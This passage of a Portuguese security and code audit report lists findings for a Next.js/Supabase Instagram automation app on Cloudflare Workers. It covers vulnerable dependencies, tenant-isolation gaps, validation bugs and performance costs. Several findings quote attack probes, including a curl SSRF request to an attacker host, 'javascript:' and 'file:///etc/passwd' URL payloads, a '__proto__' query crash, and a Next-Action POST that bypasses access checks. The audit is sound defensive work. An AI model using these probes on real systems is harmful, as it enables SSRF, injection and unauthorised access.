**O que é:** `npm audit` lista @opennextjs/cloudflare <=1.20.1 como high pelas duas advisories. GHSA-2vc4 (bypass do middleware por cache interception) exige `enableCacheInterception: true`; open-next.config.ts usa `defineCloudflareConfig()` sem opções, cujo default é false: CONFORME para este item. GHSA-c7mq: o template do worker (node_modules/@opennextjs/cloudflare/dist/cli/templates/worker.js:25-33) faz `fetch(imageUrl)` para qualquer URL após `/cdn-cgi/image/`; a borda deixa passar `/cdn-cgi\image/`. Neste projeto as rotas cobrem só `/sistema*`, então `/cdn-cgi\image/...` na raiz vai para a landing, e `/sistema/cdn-cgi/...` não casa com `startsWith("/cdn-cgi/image/")`; a Cloudflare também aplicou correção na plataforma. A exposição efetiva é baixa, mas a versão continua sem a correção de raiz.

**Como acontece:** Se a rota do Worker for ampliada (ex.: custom domain para o host inteiro, ou workers.dev/preview habilitado), `curl --path-as-is https://falow.app.br/cdn-cgi\image/x/https://atacante.example` faz o Worker buscar e servir conteúdo arbitrário sob o domínio do Falow (SSRF, abuso de IPs da Cloudflare, exposição de `/cdn-cgi/_next_cache`).

**Evidência:** npm audit: `@opennextjs/cloudflare high <=1.20.1 ... GHSA-c7mq-gh6q-6q7c ... GHSA-2vc4-c4r6-p6v6`; open-next.config.ts:3 `export default defineCloudflareConfig();` (enableCacheInterception default false em dist/api/config.js:9); wrangler.toml:16-19 rotas restritas a /sistema.

**Recomendação:** Atualizar @opennextjs/cloudflare para >= 1.20.2 (e wrangler para a versão compatível), refazer o build e os 957 testes; manter `enableCacheInterception` desligado ou, se ligar, aplicar autorização dentro das rotas e não só no middleware. Manter `workers_dev = false` e `preview_urls` desligado (default false na versão instalada).

### A3-034 [low] Zod 3.25.76 abaixo da recomendação (>= 4.5) e dentro do range da advisory GHSA-mrhx-c7xc-m3w5 (<4.6.6, exaustão de memória)
`package.json:51` · config · ⚠️ não verificado

**O que é:** A checklist da Cloudflare pede Zod 4.5.0+ (menos heap por schema no isolate de 128 MB) e o npm audit marca zod <4.6.6 como high por exaustão de memória ao validar coleções grandes com restrições. Zod é usado nas server actions de login, definir-senha, regras, sequências (grafo com arrays de nós/arestas) e admin.

**Como acontece:** Usuário logado (ou anônimo nas actions de login/definir-senha) envia um payload de server action com arrays enormes (bodySizeLimit é 26 MB em next.config.mjs:9) para um schema com `.min()/.max()` em coleções: a validação consome memória proporcional e pode derrubar o isolate que atende os demais tenants.

**Evidência:** package.json:51 `"zod": "^3.23.8"` (instalado 3.25.76); npm audit `zod high <4.6.6 GHSA-mrhx-c7xc-m3w5`; next.config.mjs:9 `serverActions: { bodySizeLimit: "26mb" }`.

**Recomendação:** Migrar para zod 4.6.6+ (importar de `zod` v4; revisar `.errors` -> `.issues` em login/actions.ts:24 e similares). Reduzir o bodySizeLimit global e tratar o upload de 25 MB do composer em rota dedicada (ou upload direto ao Storage com URL assinada), mantendo as demais actions em 1-2 MB.

### A1-044 [low] check-tenant-isolation.mjs não testa escrita cruzada: só cobre leitura de B e insert/update em ig_accounts
`scripts/check-tenant-isolation.mjs:104` · config · ⚠️ não verificado

**O que é:** O script valida que B não lê nada e que ig_accounts recusa insert/update (0022), mas não exercita as policies `with check` das tabelas em que o usuário escreve (rules, sequences, sequence_versions, folders, message_presets, quick_replies, crm_notes, crm_tags, contacts update): não tenta inserir uma rule/sequence com account_id de A usando o client de B, nem um UPDATE de B movendo `account_id` de uma linha dele para a conta de A, nem chamar as RPCs `crm_tag_rename`/`crm_tag_remove`/`falow_user_id_by_email` como authenticated (devem dar 42501), nem listar `crm-uploads` via storage com a chave anon. Hoje as policies estão corretas (todas as `for all` têm `with check` igual ao `using`), mas uma futura migration que crie uma policy sem `with check` ou esqueça o revoke numa função nova passaria no script.

**Como acontece:** Regressão silenciosa: nova policy `for update using (...)` sem `with check` em alguma tabela permitiria a um tenant re-atribuir linhas para `account_id` de outro, e o script continuaria dizendo 'Tudo ok'.

**Evidência:** check-tenant-isolation.mjs:104-139 só faz `b.from("ig_accounts").insert(...)` e `a.from("ig_accounts").update(...)`; não há `.rpc(` nem `.storage.` no script.

**Recomendação:** Acrescentar ao script: (1) B tenta `insert` em cada tabela com policy de escrita usando `account_id = aIds[0]` (esperado 42501); (2) A cria uma folder/preset e B tenta `update ... set account_id` nela (esperado 0 linhas); (3) B chama `rpc('crm_tag_remove', {p_account_id: aIds[0], p_tag_name: 'x'})` e `rpc('falow_user_id_by_email', ...)` (esperado 42501); (4) `createClient(url, anon).storage.from('crm-uploads').list('')` deve voltar vazio/erro.

### A1-014 [low] Desconectar conta não revoga o token na Meta nem cancela a assinatura de webhook
`src/app/(dashboard)/accounts/actions.ts:26` · reliability · ⚠️ não verificado

**O que é:** disconnectAccount zera access_token_enc e marca status disconnected (bom: ex-dono deixa de agir pelo @), mas não chama DELETE /me/permissions nem DELETE /me/subscribed_apps. O token de longa duração continua válido na Meta até expirar (~60 dias) e o app segue recebendo eventos do @ no webhook (descartados porque status != active, mas consumindo processamento e logs). Para o usuário, 'Desconectar' sugere que o Falow perdeu acesso à conta, o que só acontece de fato quando ele remove o app nas configurações do Instagram.

**Como acontece:** Usuário desconecta; a Meta continua entregando webhooks do @ ao Worker (ignorados) e um token eventualmente vazado de backup/log anterior continua utilizável até expirar.

**Evidência:** accounts/actions.ts:26-29 só faz update em ig_accounts; grep em src/lib/meta mostra apenas POST me/subscribed_apps (graph.ts:361), nenhum DELETE/revoke.

**Recomendação:** Antes de apagar o token, tentar (best-effort) DELETE /me/subscribed_apps e DELETE /me/permissions com o token decifrado, e orientar na UI que a remoção definitiva é nas configurações do Instagram.

### A3-028 [low] Desconectar/expirar não revoga o token na Meta nem desfaz a inscrição no webhook; a Meta continua mandando eventos do @
`src/app/(dashboard)/accounts/actions.ts:28` · webhook · ⚠️ não verificado

**O que é:** disconnectAccount só limpa a coluna no banco. O token longo continua válido na Meta por até 60 dias (ou mais, se já foi renovado) e o app continua inscrito em `me/subscribed_apps` para aquela conta profissional: a Meta segue entregando todas as DMs, comentários, reações e vistos do @ ao webhook, que gasta uma invocação do Worker + leituras em processed_events/ig_accounts por evento para descartar. O mesmo vale para contas marcadas `expired` (process.ts:534) e para usuários purgados (purge.ts apaga só no banco). Não há endpoint de revogação para tokens do Instagram Login no código; a confirmar na API se `DELETE me/subscribed_apps` está disponível para essa superfície.

**Como acontece:** Cliente desconecta @X (ou sai do produto). Cada DM que @X recebe continua virando um POST da Meta em /api/webhooks/meta → verificação de assinatura → insert em processed_events → select em ig_accounts → nada. Para um @ com volume alto isso é custo permanente de Worker/DB sem cliente associado.

**Evidência:** actions.ts:26-29 `.update({ status: "disconnected", access_token_enc: "", token_expires_at: null })` sem nenhuma chamada à Graph; graph.ts:360-364 só existe subscribeAccountToWebhooks, não há unsubscribe; purge.ts:57-59 apaga uploads e o usuário, nada na Meta.

**Recomendação:** Ao desconectar (e no purge, antes de apagar o token), chamar `DELETE /me/subscribed_apps` com o token ainda válido (best effort, antes de zerar access_token_enc) e, se a API suportar, revogar o token. Orientar o usuário a remover o app em Configurações → Apps e sites do Instagram.

### A3-030 [low] Toda renderização das páginas de contas/workflows faz 1 chamada à Graph API por conta ativa (sincronização de perfil)
`src/app/(dashboard)/accounts/page.tsx:45` · optimization · ⚠️ não verificado

**O que é:** withSyncedProfiles descriptografa o token e chama `GET /me?fields=user_id,username,profile_picture_url` para cada conta ativa a cada render de /accounts, /rules/sequencias/nova e /rules/sequencias/[id] (`dynamic` por depender de cookies). Cada visita paga a latência da Meta (timeout de até 15s por conta) antes de o HTML sair, e consome cota da Graph API do cliente, para detectar algo que muda raramente (@ e foto). Em caso de token já inválido a chamada falha toda vez e só loga.

**Como acontece:** Usuário navega entre as telas de workflows várias vezes por minuto → N chamadas /me por conta ativa; com a Meta lenta, cada página espera até 15s. O custo real é latência percebida e cota (a cota do Instagram Messaging é por conta/hora).

**Evidência:** page.tsx:45 `withSyncedProfiles(createAdminClient(), stored.filter((a) => a.status === "active"))`; account-profile.ts:61-72 Promise.all de syncAccountProfile → getInstagramProfile por conta; oauth.ts:38 `AbortSignal.timeout(15_000)`.

**Recomendação:** Gravar `profile_synced_at` e só sincronizar quando passou mais de X horas (ou fazer a sincronização em background: cron diário ou `after()`/waitUntil), devolvendo imediatamente o que está no banco. O follow-gate (gate.ts:92) já faz essa sincronização no momento em que o @ realmente importa.

### A3-032 [low] `?error=__proto__` derruba a página /accounts (lookup em objeto sem proteção de protótipo)
`src/app/(dashboard)/accounts/page.tsx:83` · bug · ⚠️ não verificado

**O que é:** `ERROR_MESSAGES[searchParams.error] ?? ERROR_MESSAGES.unknown` usa um objeto literal comum. Para `error=__proto__` o lookup devolve `Object.prototype` (objeto, não nulo), que vai como filho JSX; o React lança 'Objects are not valid as a React child' e a página inteira cai no error boundary. Para `error=constructor`/`toString` devolve uma função (React avisa e não renderiza). Verificado com node: `({unknown:"x"})["__proto__"]` → `[Object: null prototype] {}`.

**Como acontece:** Qualquer link falow.app.br/sistema/accounts?error=__proto__ mostra erro 500/boundary para o usuário logado em vez da lista de contas (autoinflição ou link enviado a um cliente).

**Evidência:** page.tsx:83 `{ERROR_MESSAGES[searchParams.error] ?? ERROR_MESSAGES.unknown}` com `ERROR_MESSAGES: Record<string, string> = {...}` (objeto literal, linha 15).

**Recomendação:** Usar `Object.hasOwn(ERROR_MESSAGES, key) ? ERROR_MESSAGES[key] : ERROR_MESSAGES.unknown`, um Map, ou criar o objeto com `Object.create(null)`.

### A2-032 [low] Página Contatos envia até 2000 contatos com todos os campos ao navegador para buscar/exportar no cliente
`src/app/(dashboard)/contatos/page.tsx:15` · optimization · ⚠️ não verificado

**O que é:** `CONTACTS_LIMIT = 2000` e `select("*, ig_accounts(ig_username)")` (linhas 33-37) carregam até 2000 linhas inteiras (fields JSON, tags, timestamps) e as passam como prop ao client component `ContactsTable`, ou seja, tudo vai serializado no payload RSC/HTML a cada navegação para /contatos, e a busca é feita em memória no browser (contacts-table.tsx:70-80). O `limit(2000)` ainda esbarra no teto `max_rows` do PostgREST (padrão 1000 no Supabase, a confirmar), então na prática o corte pode acontecer em 1000.

**Como acontece:** Custo real: para um tenant com milhares de contatos, cada visita a /contatos transfere centenas de KB a alguns MB, aumenta CPU time do Worker (serialização) e o tempo até interação; a busca/CSV ficam limitados aos 2000 (ou 1000) mais recentes (contatos antigos somem silenciosamente do export).

**Evidência:** contatos/page.tsx:15 `const CONTACTS_LIMIT = 2000;`, :33-37 `.from("contacts").select("*, ig_accounts(ig_username)").order("updated_at", ...).limit(CONTACTS_LIMIT)`; :72 `<ContactsTable contacts={contacts} ...>`.

**Recomendação:** Paginar no servidor (cursor por updated_at) e mover a busca para a query (`or(ig_username.ilike..., fields::text ilike...)`, com o mesmo `sanitizeSearch` do Inbox); gerar o CSV em uma server action/route que pagina pelo banco em vez de depender da lista carregada.

### A2-033 [low] Dashboard carrega até 5000 interações para a série de 14 dias e faz formatação de data em loop O(n×14) a cada render
`src/app/(dashboard)/dashboard/page.tsx:115` · optimization · ⚠️ não verificado

**O que é:** Para montar a série de 14 dias, a página busca até 5000 linhas (`select("created_at, status")...limit(5000)`, linhas 82-88; o PostgREST devolve no máximo `max_rows`, padrão 1000 — a confirmar) e, para cada linha, chama `chartData.findIndex` que roda `format(subDays(now, 13 - i), "yyyy-MM-dd")` até 14 vezes (115-125): ~70k formatações de data por render, no Worker, a cada visita ao /dashboard. O `Map byDay` criado nas linhas 107-113 é populado mas nunca lido. Acima do teto (5000, ou 1000 pelo PostgREST) o gráfico passa a ficar errado (silenciosamente truncado).

**Como acontece:** Custo real: CPU time do Worker (dezenas de ms em format()) e latência na página inicial do painel para contas movimentadas; gráfico incorreto/subcontado acima do teto de linhas (ex.: conta com 3.000 interações em 14 dias mostra no máximo 1.000 se o max_rows for 1000).

**Evidência:** dashboard/page.tsx:83-87 `.select("created_at, status")...gte("created_at", since14).limit(5000)`; :107 `const byDay = new Map<...>()` (preenchido em 113, nunca usado); :117-119 `const idx = chartData.findIndex((_, i) => format(subDays(now, 13 - i), "yyyy-MM-dd") === key);`.

**Recomendação:** Agregar no banco (view ou RPC `group by date_trunc('day', created_at), status`) e usar o `byDay` já criado para lookup O(1) em vez do findIndex com format; remover o `limit(5000)` ao agregar.

### A3-021 [low] Cada navegação do painel repete 3 getUser() ao Supabase Auth, a checagem de acesso, a leitura/decifração da chave de IA e a listagem de até 200 presets
`src/app/(dashboard)/layout.tsx:16` · optimization · ⚠️ não verificado

**O que é:** O middleware já chama `supabase.auth.getUser()` (requisição HTTP ao Auth) e `hasActiveAccess` (access_grants + subscriptions) para cada request não-API, incluindo os prefetches RSC que o `<Link>` dispara ao entrar no viewport. O layout do dashboard chama `getUser()` de novo (layout.tsx:16-18) e, em todo request de página do painel, executa `Promise.all([listPresets(), isAiEnabled(), getUnreadTotal(supabase)])` (layout.tsx:30-34): listPresets faz SELECT de até 200 linhas de message_presets de todas as contas do usuário; isAiEnabled → getEffectiveAiConfig → readUserRow chama `getUser()` uma 3ª vez (ai-settings/server.ts:38), faz `select("*")` em user_ai_settings (trazendo api_key_enc para o servidor) e decryptOrNull (AES-GCM) só para saber se existe chave. Somando, são 3 idas ao Auth + 5 consultas + 1 decrypt antes de a página começar, a cada clique ou prefetch, sem cache por request/usuário; a chave decifrada fica em memória a cada navegação sem necessidade, e em telas sem campo de texto (CRM, logs, contatos) nada disso é usado.

**Como acontece:** Lista com 20 links visíveis → 20 prefetches × (getUser + 2 consultas) no middleware; abrir a página → mais 2 getUser + 5 consultas + 1 decrypt. Para o dono/admin, ainda isAdmin + aiConfigFromEnv.

**Evidência:** middleware.ts:41-47 `await supabase.auth.getUser(); ... hasActiveAccess(supabase, user.id)`; layout.tsx:16-18 `supabase.auth.getUser()`; layout.tsx:30-34 `await Promise.all([listPresets(), isAiEnabled(), getUnreadTotal(supabase)])`; ai-settings/server.ts:38 `await supabase.auth.getUser()`; server.ts:45-49 `.select("*")`; server.ts:79 `const apiKey = row ? decryptOrNull(row.api_key_enc) : null;`.

**Recomendação:** Envolver createClient/getUser em `React.cache()` para deduplicar dentro da mesma renderização; no middleware, usar `getSession()`/claims do JWT para a decisão de rota e deixar a validação forte para rotas sensíveis; cachear o resultado de hasActiveAccess em cookie assinado ou KV por alguns minutos; para isAiEnabled, consultar só `user_id` (count/exists) sem decifrar; carregar presets e IA sob demanda no SmartTextField (ou via React cache() por request), filtrando pela conta da automação em edição, em vez de no layout.

### A0-040 [low] saveRule reporta sucesso ao 'editar' uma automação que não existe ou não é do usuário; outras actions de escrita também não conferem linha afetada
`src/app/(dashboard)/rules/actions.ts:300` · bug · ⚠️ não verificado

**O que é:** No caminho de update, saveRule faz update().eq('id', input.id) sem select e devolve { id: input.id, error } — com RLS, um id alheio ou inexistente vira no-op silencioso (error null), a action segue para revalidatePath e findConflictingRuleName e devolve {} (sucesso). O mesmo padrão (update/delete sem conferir contagem) está em toggleRule:363, deleteRule:421, renameFolder:68, deleteFolder:83, moveToFolder:99, deletePreset:62 e toggleSequence:410. Não há vazamento, mas o usuário vê 'salvo' para algo que não foi gravado (ex.: automação apagada em outra aba), e toggleRule devolve {} depois de não achar a regra.

**Como acontece:** Usuário A abre a tela de edição de uma regra, a regra é apagada (outra aba/expiração), ele salva: saveRule devolve sucesso, nenhuma linha é alterada e a tela redireciona como se tivesse salvo. Chamada direta com id de outro tenant também recebe 'sucesso'.

**Evidência:** rules/actions.ts:300-301 `const { error } = await supabase.from("rules").update(values).eq("id", input.id); return { id: input.id, error };` — contraste com sequencias/actions.ts:347-357 que usa .select("id").maybeSingle() e trata `!data` como erro.

**Recomendação:** Encadear .select('id').maybeSingle() (ou conferir count) nos updates/deletes e devolver erro 'não encontrado' quando nenhuma linha for afetada, como já faz saveSequence.

### A1-012 [low] media_refs aceita strings sem limite e sem validação de URL (até 30 itens por regra)
`src/app/(dashboard)/rules/actions.ts:36` · security · ⚠️ não verificado

**O que é:** mediaRefSchema valida apenas o tipo: id, media_type, thumbnail_url, permalink e caption são z.string() sem max nem url(). O conteúdo é gravado em rules.media_refs (jsonb) e thumbnail_url volta para o navegador como src de <img> (media-picker.tsx:40, comment-phone-preview.tsx:128). Permite inflar a linha (30 × strings arbitrárias, só limitada pelo body da request) e guardar URLs de origem arbitrária que o próprio navegador do usuário vai requisitar ao abrir a tela (vazamento de IP/referer para o host escolhido). Impacto restrito ao próprio tenant; o matching do webhook só usa id.

**Como acontece:** Chamada direta a saveRule com media_refs: 30 objetos com caption de 1 MB cada → linha de ~30 MB em rules e payload pesado em toda listagem/edição que faz select('*'); ou thumbnail_url 'http://atacante/x.png' carregado pelo navegador do dono ao editar.

**Evidência:** rules/actions.ts:36-42 `id: z.string(), media_type: z.string(), thumbnail_url: z.string().nullable(), permalink: z.string().nullable(), caption: z.string().nullable()`.

**Recomendação:** Limitar tamanhos (id ≤ 64, caption ≤ 2200, media_type enum IMAGE/VIDEO/CAROUSEL_ALBUM), exigir URL https com host do CDN da Meta (cdninstagram.com / instagram.com) para thumbnail_url/permalink, ou melhor: gravar só os ids e re-resolver a mídia ao renderizar.

### A1-013 [low] Botões de link da automação aceitam esquemas não-http (javascript:, data:, ftp:) enquanto o workflow exige http(s)
`src/app/(dashboard)/rules/actions.ts:33` · bug · ⚠️ não verificado

**O que é:** buttonSchema usa z.string().url(), que aceita qualquer esquema parseável por new URL(). validateReply também aceita qualquer esquema para reply_image_url. Já o grafo de workflow (graph.ts:297-304 isValidUrl) exige http/https. Os builders normalizam para https:// no cliente, mas a action pode ser chamada direto. Botão web_url com esquema não-http é recusado pela Meta na hora do envio, então a automação é salva como válida e falha só quando alguém comenta/manda DM.

**Como acontece:** Chamada direta a saveRule com reply_buttons: [{ title: 'x', url: 'javascript:alert(1)' }] → salva OK; no disparo, o envio do button template falha e o lead fica sem resposta.

**Evidência:** rules/actions.ts:33 `url: z.string().url("URL do botão inválida.")`; rules/actions.ts:200 `z.string().url().safeParse(input.reply_image_url)`; comparar com graph.ts:297-304.

**Recomendação:** Reaproveitar o mesmo isValidUrl (apenas http/https, com max de 2000) para reply_buttons[].url e reply_image_url.

### A3-014 [low] Palavra-chave que vira zero termos passa na validação e a automação nunca dispara
`src/app/(dashboard)/rules/actions.ts:230` · bug · ⚠️ não verificado

**O que é:** validateRule só exige `keyword.trim()` não vazio, mas o motor usa keywordTerms/keywordMatches (engine.ts:20-36), que divide por vírgula, normaliza e descarta termos vazios. Uma keyword como ",", ", ," ou " , " passa pela validação, é salva ativa e `terms.some(...)` sobre lista vazia devolve false para sempre. O mesmo vale para a checagem de conflito (shareTerm), que também devolve false.

**Como acontece:** Usuário digita "," ou "preço,," por engano (ou uma vírgula sozinha) no campo palavra-chave → salvamento OK sem aviso → nenhuma DM/comentário casa; o dono só percebe pelos logs "no_match".

**Evidência:** actions.ts:230 `} else if (!input.keyword?.trim()) { return "Informe a palavra-chave."; }` vs engine.ts:33-36 `.split(",").map(normalizeText).filter(Boolean)` e engine.ts:38 `terms.some(...)` (lista vazia → false).

**Recomendação:** Validar com `keywordTerms(input.keyword).length > 0` (tanto para DM quanto para comentário sem comment_any_word) e devolver a mensagem "Informe a palavra-chave" quando sobrar zero termos.

### A3-015 [low] URL de botão e de imagem aceitam qualquer esquema (javascript:, data:, ftp:) no servidor
`src/app/(dashboard)/rules/actions.ts:33` · security · ⚠️ não verificado

**O que é:** buttonSchema usa `z.string().url()` e reply_image_url usa o mesmo validador (actions.ts:200). Confirmado com o zod 3.25.76 do projeto: `javascript:alert(1)`, `data:text/html,...`, `ftp://x`, `mailto:` e `http://localhost` passam. A única defesa é normalizeUrl (links.ts:26-29) no builder do cliente, que prefixa https:// quando não há http(s), mas a server action pode ser chamada direto. Hoje a URL só vai para a Meta como botão web_url (graph.ts:323), que recusa esquemas não http(s), então o efeito atual é a automação falhar na hora do disparo (status error no log) sem aviso no salvamento; se algum lugar do painel passar a renderizar `reply_buttons[].url` em `href`, vira XSS armazenado.

**Como acontece:** Usuário logado chama saveRule com `reply_buttons: [{ title: "x", url: "javascript:alert(1)" }]` (ou reply_image_url `file:///etc/passwd`) → salvo. No disparo, sendButtonsMessage envia web_url inválido → GraphApiError → interaction "error"; o seguidor não recebe nada e o dono só vê no log.

**Evidência:** actions.ts:31-34 `url: z.string().url("URL do botão inválida.")`; teste local: `z.string().url().safeParse("javascript:alert(1)").success === true`.

**Recomendação:** Trocar por um refinamento que exija `new URL(v).protocol` em {"http:","https:"} (e, para imagem, apenas https), aplicado também em reply_image_url; opcionalmente rejeitar hosts internos/localhost. Manter normalizeUrl no cliente só como conveniência.

### A1-011 [low] generateForField não valida `field` (crash) nem limita tamanho de instruction/context
`src/app/(dashboard)/rules/ai-actions.ts:27` · bug · ⚠️ não verificado

**O que é:** A action confia no tipo TypeScript: `field` não é validado em runtime. Valor desconhecido faz aiFieldSpec() devolver undefined e buildFieldPrompt lê spec.role (prompt.ts:53) → TypeError não tratado dentro da server action (erro genérico do Next para o cliente, stack no log). `instruction` e os campos de `context` não têm limite de tamanho: viram parte do prompt enviado ao provedor com a chave do usuário (ou a da instalação, no caso de admins), sem teto de tokens. `count` com NaN passa pelo clamp e gera 'Escreva NaN opções'.

**Como acontece:** Usuário logado chama generateForField({ field: 'x' }) → exceção não tratada; ou envia instruction com centenas de KB → requisição grande ao provedor cobrada na chave configurada.

**Evidência:** ai-actions.ts:27-44 sem zod; prompt.ts:49-53 `const spec = aiFieldSpec(input.field); ... spec.role`; fields.ts:80-82 `return AI_FIELD_SPECS[field]`.

**Recomendação:** Validar o input com zod (field em z.enum das chaves de AI_FIELD_SPECS, count int 1-5, instruction max ~300, context strings com max) e devolver { error } em vez de deixar lançar.

### A3-016 [low] generateForField não valida field, count nem tamanho de instruction/context (custo e prompt quebrado)
`src/app/(dashboard)/rules/ai-actions.ts:27` · security · ⚠️ não verificado

**O que é:** A server action aceita o input tipado só em TypeScript: `field` não é conferido contra AI_FIELD_SPECS (fields.ts:80-82 faz `AI_FIELD_SPECS[field]`, então "__proto__", "constructor" ou "toString" devolvem um objeto sem role/maxChars e a chamada ao provedor acontece com prompt "opções de texto para undefined" e sem filtro de tamanho; um nome inexistente lança TypeError não tratado); `count` não numérico vira NaN em `Math.min(Math.max(input.count ?? 3, 1), 5)` (confirmado em node) e `parseSuggestions` nunca atinge `result.length === NaN`, devolvendo todas as linhas; `instruction`, ruleName, keyword e accountUsername não têm limite de tamanho e entram crus no prompt (prompt.ts:37-56). Não há rate limit por usuário: cada chamada custa tokens e segura um fetch de até 30 s no Worker.

**Como acontece:** Usuário logado (com chave própria, ou dono/admin usando a chave da instalação) chama a action direto com `{ field: "__proto__", count: "x", instruction: <200 KB> }` em loop → gasto na chave (a da instalação, no caso de admin), fetches de 30 s acumulados no Worker e sugestões sem limite de caracteres devolvidas à UI.

**Evidência:** ai-actions.ts:27-45 (nenhum schema); fields.ts:81 `return AI_FIELD_SPECS[field];`; provider.ts:42 `const count = Math.min(Math.max(input.count ?? 3, 1), 5);`; teste local: `SPECS["__proto__"]` → object sem role/maxChars; `Math.min(Math.max("abc",1),5)` → NaN.

**Recomendação:** Validar o input com zod: `field: z.enum(Object.keys(AI_FIELD_SPECS))`, `count: z.number().int().min(1).max(5)`, `instruction: z.string().max(200)`, context com max por campo; usar `Object.hasOwn(AI_FIELD_SPECS, field)`; aplicar um rate limit simples por usuário (ex.: contador em KV/DB por minuto) e logar uso quando a chave for a da instalação.

### A3-017 [low] Actions de IA e presets não conferem acesso (bloqueio/assinatura); dependem só do middleware
`src/app/(dashboard)/rules/ai-actions.ts:33` · security · ⚠️ não verificado

**O que é:** generateForField, saveAiSettings, savePreset/deletePreset e listPresets só exigem sessão (auth.getUser) ou RLS; a regra de acesso (hasActiveAccess: bloqueio, cortesia, assinatura) vive apenas no middleware. O middleware devolve `next()` sem checar acesso para PUBLIC_PATHS ("/", "/privacidade"...) e para /api. Server actions do App Router são roteadas pelo header Next-Action, não pelo caminho: um POST para "/" com o id da action executa a action normalmente. A confirmar com um teste na instalação (comportamento do Next 14.2 + basePath), mas é o padrão documentado do framework.

**Como acontece:** Cliente bloqueado (access_grants blocked) ou com assinatura cancelada, ainda com cookie de sessão válido, envia POST para https://falow.app.br/sistema/ com header Next-Action=<id de generateForField> e body com o input → middleware deixa passar (PUBLIC_PATHS) → action roda: gera texto com a chave dele, salva/apaga presets e grava chave de IA, mesmo sem acesso ao painel.

**Evidência:** middleware.ts:13 `if (pathname.startsWith("/api") || PUBLIC_PATHS.has(pathname)) return NextResponse.next();`; ai-actions.ts:33-39 só checa `getEffectiveAiConfig()` (sessão); presets-actions.ts:42-47 só RLS; nenhuma chamada a hasActiveAccess nessas actions.

**Recomendação:** Criar um helper `requireAccess()` (sessão + hasActiveAccess) e chamá-lo no início de toda server action do painel (ai-actions, presets-actions, ai-settings/actions, rules/actions), em vez de confiar no middleware; adicionalmente, no middleware, aplicar a checagem de acesso também a POSTs com header Next-Action mesmo em PUBLIC_PATHS.

### A1-010 [low] moveToFolder aceita folder_id de qualquer tenant e não valida os ids
`src/app/(dashboard)/rules/folders-actions.ts:99` · security · ⚠️ não verificado

**O que é:** moveToFolder grava input.folderId direto em rules/sequences.folder_id. O RLS confere apenas que a regra/sequência é do usuário; a FK folders(id) não exige que a pasta pertença à mesma conta/usuário, e a action não confere posse da pasta nem valida id/folderId como uuid nem `kind` como enum (qualquer string vira 'sequences'). Resultado: referência cruzada entre tenants (a regra de A aponta para a pasta de B). O impacto prático é baixo (A não enxerga a pasta de B pelo RLS e a contagem de B só considera itens dele), mas é uma invariante de isolamento quebrada e fonte de inconsistência (item some de todas as pastas visíveis).

**Como acontece:** Usuário A, de posse de um uuid de pasta de B (vazado por log/URL/suporte), chama moveToFolder({ kind: 'rule', id: <regra de A>, folderId: <pasta de B> }); o update passa pelo RLS de rules e a FK aceita.

**Evidência:** folders-actions.ts:99-102 `.from(table).update({ folder_id: input.folderId }).eq("id", input.id)` sem consulta prévia a folders; migration 0015:30 `folder_id uuid references public.folders (id)` sem check de conta.

**Recomendação:** Validar com zod (kind enum, ids uuid) e, quando folderId não for nulo, conferir via client RLS que a pasta existe e tem o mesmo account_id do item antes do update (ou mover a invariante para o banco com trigger/constraint).

### A1-015 [low] saveSequence faz até 10 round-trips sequenciais ao Supabase (histórico de versões + checagens de conflito carregando todos os grafos)
`src/app/(dashboard)/rules/sequencias/actions.ts:369` · optimization · ⚠️ não verificado

**O que é:** Cada salvamento executa em sequência: isStoredExpired, rules.in, sequences.in, pipeline_stages.in, update/insert, insert em sequence_versions, select de versões a partir da 30ª, delete das antigas, e depois findConflictingSequenceName que carrega id+name+graph de TODAS as sequências ativas da conta (jsonb inteiro) e todas as rules DM ativas. Em contas com dezenas de workflows, cada save transfere todos os grafos só para comparar o gatilho. Latência percebida no botão Salvar e custo de egress do Supabase.

**Como acontece:** Conta com 40 workflows ativos: cada 'Salvar' baixa 40 grafos completos (podem ter 60 nós cada) + 3 queries de poda de histórico, em série, antes de responder.

**Evidência:** sequencias/actions.ts:369-389 (insert + select range(30,1000) + delete) e :218-226 `.select("id, name, graph").eq("account_id").eq("is_active", true)`.

**Recomendação:** Rodar as consultas independentes em Promise.all; podar versões com um único delete via subquery/RPC (ou trigger no banco); para o conflito, usar entry_rule_id e um campo indexado com a palavra-chave/anyMessage do gatilho em vez de baixar o jsonb de todos os workflows.

### A2-027 [low] zod 3.x (GHSA-mrhx-c7xc-m3w5): z.array().max() não interrompe a validação, e o limite de corpo de 26 MB deixa um usuário logado forçar validação de centenas de milhares de itens
`src/app/(dashboard)/rules/sequencias/actions.ts:167` · security · ⚠️ não verificado

**O que é:** A advisory (fix apenas em zod 4.6.6; `package.json:46` pede `^3.23.8`, instalado 3.25.76) descreve consumo de memória ao validar coleções grandes: o parser acumula um issue por elemento inválido sem teto nem parada antecipada. No zod 3 instalado o comportamento é o mesmo: `node_modules/zod/v3/types.js:1788-1810` registra o issue de `maxLength` e ainda assim faz `[...ctx.data].map(...)` validando todos os elementos. Os schemas do Falow têm `.max()` (`nodes: z.array(nodeSchema).max(MAX_NODES)` com MAX_NODES=40 em `src/lib/sequences/graph.ts:36`; `media_refs ... .max(30)` em `rules/actions.ts:65`; `reply_buttons .max(3)` em `rules/actions.ts:94`; `options .max(13)` em `sequencias/actions.ts:79`), mas o `.max` não evita o trabalho. Como `next.config.mjs:9` permite corpo de Server Action de 26 MB, um cliente autenticado pode mandar `nodes` com ~500 mil objetos. O zod é a única dependência vulnerável de produção usada em caminho de entrada de usuário (server actions); `npm audit --omit=dev` também lista nanoid <=3.3.17 (loop infinito com size inválido), qs 6.7-6.16 (TypeError em stringify), source-map-js e postcss, que são dependências de build do Next ou não expostas (ver resumo do npm audit). O impacto fica confinado a uma invocação do Worker (limite de CPU/128 MB) e exige conta válida, por isso baixo.

**Como acontece:** Usuário logado (trial, assinante, ou cliente bloqueado com sessão ainda válida) chama a Server Action de salvar sequência com `nodes` = array de 500 mil objetos malformados (26 MB). O Next deserializa, `sequenceSchema.safeParse(raw)` (linha 269) valida item a item e gera um issue por item -> CPU/memória da invocação esgotados; repetido, degrada o Worker compartilhado com webhooks.

**Evidência:** node_modules/zod/v3/types.js:1789 `if (ctx.data.length > def.maxLength.value) { addIssueToContext(...); status.dirty(); }` seguido de :1808 `const result = [...ctx.data].map(...)`; OSV GHSA-mrhx-c7xc-m3w5: zod >=0 <4.6.6; npm audit: zod <4.6.6 high; nanoid <=3.3.17 high; qs 6.7.0-6.16.0 moderate; postcss/source-map-js via next

